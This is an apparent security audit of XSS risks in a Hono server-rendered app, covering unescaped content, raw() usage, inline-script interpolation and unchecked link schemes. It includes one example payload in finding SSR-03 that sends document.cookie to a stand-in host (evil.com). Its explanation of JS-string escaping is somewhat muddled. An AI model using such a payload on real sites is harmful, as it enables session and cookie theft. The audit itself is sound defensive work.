# Lens 070 — Server-Side Rendering Correctness

**Distinct value:** Audits template escaping safety, XSS vectors via string interpolation, proper use of Hono's `html` tag vs `raw()`, and template composition correctness. This is the security-critical rendering layer for a server-rendered app.

**Tenancy-critical:** Yes. If user-controlled data from one product leaks unescaped into HTML rendered for another founder (e.g., cross-company decision patterns), it is both an XSS and a data-isolation issue.

## Executive Summary

Foundry correctly uses Hono's `html` tagged template literal for most rendering, which auto-escapes interpolated values. This is the right default. However, there are 10 uses of `raw()` across 4 files, which bypass escaping entirely. Most are legitimate (SVG injection, pre-sanitized HTML), but the onboarding chat uses `raw(safeContent)` where `safeContent` is the result of a manual `escapeHtml()` function that replaces `\n` with `<br>` — introducing `<br>` as raw HTML. If the manual escaper has a gap, this is an XSS vector. Additionally, there is one case study route that renders `artifact.content` directly without any escaping, and several routes interpolate user-controlled strings into `onclick` handlers and `href` attributes without attribute-context escaping.

## Findings

### SSR-01 Case Study Content Rendered Without Escaping
- **Severity:** P0 (Critical)
- **Description:** The case study detail page renders `artifact.content` directly into the HTML: `<div class="card">${artifact.content}</div>`. The `artifact.content` comes from the `founding_story_artifacts` table which stores content generated by AI and potentially edited by founders. If this content contains HTML tags or script injection, it will be rendered as-is. While Hono's `html` tag escapes by default, if the content is stored as an `HtmlEscapedString` or passed through `raw()` anywhere in the chain, it would be unescaped.
- **Evidence:** `src/routes/public/landing.ts:249` — `<div class="card">${artifact.content}</div>`. This is a public page (no auth required), making it a reflected XSS vector if content contains malicious HTML.
- **Remediation:** Verify that `artifact.content` is always auto-escaped by Hono's `html` tag. If it can contain HTML formatting (markdown rendered to HTML), use a sanitizer like DOMPurify server-side. Never store pre-escaped HTML in the database.
- **Target Phase:** 1

### SSR-02 Onboarding Chat Uses Manual escapeHtml + raw()
- **Severity:** P1
- **Description:** The onboarding chat renders message content through a manual `escapeHtml()` function that replaces `&`, `<`, `>`, `"`, `'` with entities, then replaces `\n` with `<br>`, then passes the result to `raw()`. The `raw()` call bypasses Hono's auto-escaping. If the manual escaper misses an edge case (e.g., null bytes, Unicode bypass, attribute context), the `raw()` call passes it through to the DOM. The standard approach is to let Hono's `html` tag handle escaping and use CSS `white-space: pre-wrap` for line breaks instead of `<br>`.
- **Evidence:** `src/routes/dashboard/onboarding-chat.ts:23-29` — manual `escapeHtml()` function. Lines 40,47 — `${raw(safeContent)}`.
- **Remediation:** Remove the `escapeHtml()` function. Use Hono's `html` tag for content interpolation and CSS `white-space: pre-wrap` or `white-space: pre-line` on the message bubble divs. This eliminates the need for `raw()` entirely for user content.
- **Target Phase:** 1

### SSR-03 Decision ID Interpolated Into Inline Script
- **Severity:** P1
- **Description:** The Decision Chamber injects the decision ID directly into an inline `<script>` block: `const decisionId = '${decisionId}';`. The `decisionId` comes from the URL parameter `c.req.param('id')`. While Hono's `html` tag escapes the value in HTML context, the value is inside a JavaScript string literal context. A crafted `decisionId` like `'; document.location='//evil.com?c='+document.cookie;//` would not be properly escaped by HTML entity encoding (which is what Hono's tag does) because the single quotes are already inside a JS string. However, Hono does escape single quotes to `&#39;`, which would break out of the HTML attribute but not the JS string in all cases.
- **Evidence:** `src/routes/dashboard/decisions.ts:185` — `const decisionId = '${decisionId}';` inside a `<script>` block.
- **Remediation:** Use `data-*` attributes on a DOM element and read them in JS: `<div data-decision-id="${decisionId}">` then `const id = document.querySelector('[data-decision-id]').dataset.decisionId;`. This keeps the value in HTML attribute context where Hono's escaping is correct.
- **Target Phase:** 1

### SSR-04 raw() Usage Inventory — Mostly Safe
- **Severity:** P2
- **Description:** Inventory of all `raw()` calls:
  - `src/routes/dashboard/index.ts:23,31` — SVG sparkline (server-generated, no user input) - SAFE
  - `src/routes/dashboard/index.ts:70` — Signal anatomy row value (server-computed string like "+5") - SAFE
  - `src/routes/dashboard/index.ts:178` — Signal delta span (server-computed HTML) - SAFE
  - `src/views/layout.ts:328` — Mobile nav SVG icons (hardcoded strings) - SAFE
  - `src/routes/dashboard/onboarding-chat.ts:40,47` — Chat messages (manual escape + raw) - SEE SSR-02
  - `src/routes/dashboard/agents-temporal.ts:170,213` — Sparkline SVG and badge HTML (server-generated) - SAFE
  - `src/routes/signal/timeline.ts:213` — SVG timeline (server-generated) - SAFE
- **Evidence:** 10 total `raw()` calls. 8 are safe (server-generated content, no user input). 2 are concerning (chat messages via manual escaper).
- **Remediation:** Document the `raw()` usage policy: `raw()` should only be used for server-generated HTML (SVGs, computed badges). Never for user-controlled content.
- **Target Phase:** 2

### SSR-05 Hono html Tag Provides Correct Default Escaping
- **Severity:** (Positive Finding)
- **Description:** The vast majority of rendering uses Hono's `html` tagged template literal, which auto-escapes interpolated values. Product names, founder names, decision descriptions, stressor signals, and AI-generated content are all passed through the auto-escaper. This is the correct security posture.
- **Evidence:** `src/views/layout.ts:6` — `import { html, raw } from 'hono/html'`. All view components use `html` tag for rendering. `src/views/components.ts` — all component functions return `html\`...\`` with proper interpolation.
- **Remediation:** N/A — maintain this pattern.
- **Target Phase:** N/A

### SSR-06 Notification Action URLs Not Validated
- **Severity:** P2
- **Description:** Notification `action_url` values are rendered directly into `<a href="${n.action_url}">` elements. If a notification is created with a `javascript:` URL or a malicious external URL, it will be rendered as a clickable link. The notification data comes from the database but could be inserted by AI agents or service code.
- **Evidence:** `src/views/layout.ts:203` — `${n.action_url ? html\`<a href="${n.action_url}"...\`}`.
- **Remediation:** Validate that `action_url` starts with `/` (relative) or `https://` before rendering. Reject `javascript:`, `data:`, and other dangerous schemes.
- **Target Phase:** 2

## Embarrassment Test
1. A security researcher finds that the case study public page renders database content that could contain XSS payloads, accessible without authentication.
2. A penetration tester crafts a decision ID with embedded JavaScript and demonstrates code execution in the Decision Chamber.

## Recommendations (Priority Order)
1. Fix case study content rendering — ensure escaping or sanitize (P0, Phase 1)
2. Replace manual escapeHtml + raw() in chat with Hono html tag + CSS (P1, Phase 1)
3. Move decision ID from inline script to data attribute (P1, Phase 1)
4. Validate notification action_url schemes (P2, Phase 2)
5. Document raw() usage policy — server-generated content only (P2, Phase 2)
